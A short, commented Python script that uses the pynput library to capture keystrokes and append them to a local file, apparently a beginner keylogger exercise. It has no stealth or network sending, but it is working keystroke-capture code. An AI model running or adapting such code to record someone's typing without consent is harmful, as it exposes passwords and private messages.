'''from pynput import keyboard                                     # From pynput library import keyboard module.       

def keypressed(key):                                            # Define keypressed function. 
    print(str(key))                                             # Convert to string and print it.
    with open("keyfile.txt", 'a') as logkey:                    # Open key file if it doesn't exist make it and append to the file.
        try:
            char = key.char
            logkey.write(char)
        except:                                                 # If the key is not a char it catches the error and prints an error statement.
            print("Error getting the char")

if __name__ == "__main__":                                      # Checks that the script is running as the main program and isn't being imported. 
    listener = keyboard.Listener(on_press = keypressed)         # on_press automatically passes key into the function.
    listener.start()                                            # Start the listener and monitor the keyboard.
    input()                                                     # Pause the execution of the script until a new key is pressed.
'''